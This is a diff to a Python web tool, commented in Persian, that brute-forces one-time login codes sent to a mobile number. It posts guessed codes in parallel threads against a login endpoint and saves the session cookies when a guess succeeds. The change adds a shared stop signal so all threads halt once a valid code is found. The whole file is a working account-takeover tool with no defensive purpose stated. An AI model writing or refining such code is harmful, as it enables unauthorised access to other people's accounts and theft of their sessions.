@@ -24,6 +24,7 @@ current_status = {
     "error": None
 }
 last_cookie_file = None  # برای ذخیره مسیر آخرین فایل کوکی
+stop_event = threading.Event()  # برای توقف فوری همه نخ‌ها
 
 def save_cookies(cookies, code_str):
     """ذخیره کوکی‌ها و برگردوندن لینک"""
@@ -39,7 +40,7 @@ def save_cookies(cookies, code_str):
     if os.path.exists(cookies_file) and os.path.getsize(cookies_file) > 0:
         progress_log.append(f"Cookies saved in {cookies_file}")
         print(f"Cookies saved in {cookies_file}")  # لاگ به ترمینال
-        last_cookie_file = cookies_file  # ذخیره مسیر آخرین فایل کوکی
+        last_cookie_file = cookies_file
         return True
     else:
         progress_log.append(f"Error: Failed to save cookies to {cookies_file}")
@@ -82,6 +83,8 @@ def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retrie
     code_str = ''.join(map(str, code_values))
 
     for attempt in range(max_retries + 1):
+        if stop_event.is_set():  # اگه موفقیت پیدا شده، متوقف شو
+            return False
         try:
             response = requests.post(url, headers=headers, data=data, timeout=15)
             response.raise_for_status()
@@ -97,18 +100,15 @@ def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retrie
                     save_cookies(response.cookies, code_str)
                     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                     output_file = f"success_{code_str}_{timestamp}.txt"
-                    cookie_link = f"http://{request.host}/last_cookie"
                     with open(output_file, 'w', encoding='utf-8') as f:
-                        f.write(msg + f"\nLast cookie file: {cookie_link}\n")
-                    success_msg = (f"Code {code_str} found successfully! Process stopped.\n"
-                                   f"Output saved in {output_file}\n"
-                                   f"Last cookie: {cookie_link}")
-                    progress_log.append(success_msg)
-                    print(success_msg)  # لاگ به ترمینال
-                    current_status["error"] = success_msg
+                        f.write(msg + "\nLast cookie file will be available after process stops.\n")
+                    progress_log.append(f"Output saved in {output_file}")
+                    print(f"Output saved in {output_file}")  # لاگ به ترمینال
+                    current_status["error"] = f"Code {code_str} found successfully!"
                     current_status["running"] = False
                     found_success = True
-                    running = False  # توقف فوری
+                    running = False
+                    stop_event.set()  # سیگنال توقف به همه نخ‌ها
                     return True
                 else:
                     progress_log.append(f"Failed with code {code_str} (number {counter}): {json_response}")
@@ -143,6 +143,7 @@ def generate_code(counter):
 
 def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_range):
     global running, found_success, current_status
+    stop_event.clear()  # ریست سیگنال توقف
     progress_log.append(f"Starting bruteforce from {start_range} to {end_range}...")
     print(f"Starting bruteforce from {start_range} to {end_range}...")  # لاگ به ترمینال
     current_status = {
@@ -155,10 +156,14 @@ def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_
     found_success = False
 
     for batch_start in range(start_range, end_range, batch_size):
-        if not running or found_success:
-            if found_success:
-                progress_log.append("Process stopped: Successful code found!")
-                print("Process stopped: Successful code found!")  # لاگ به ترمینال
+        if not running or found_success or stop_event.is_set():
+            if found_success or stop_event.is_set():
+                cookie_link = f"http://{request.host}/last_cookie"  # لینک توی context اصلی
+                success_msg = (f"Code found successfully! Process stopped.\n"
+                               f"Last cookie: {cookie_link}")
+                progress_log.append(success_msg)
+                print(success_msg)  # لاگ به ترمینال
+                current_status["error"] = success_msg
             else:
                 progress_log.append("Process stopped manually!")
                 print("Process stopped manually!")  # لاگ به ترمینال
@@ -185,7 +190,7 @@ def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_
                     print(f"Exception in future: {str(e)}")  # لاگ به ترمینال
                     current_status["error"] = str(e)
 
-        if found_success:
+        if found_success or stop_event.is_set():
             break  # توقف حلقه اصلی
 
         current_status["processed"] = batch_end
@@ -223,6 +228,7 @@ def start():
 def stop():
     global running
     running = False
+    stop_event.set()  # سیگنال توقف دستی
     progress_log.append("Stop button clicked!")
     print("Stop button clicked!")  # لاگ به ترمینال
     return '', 204
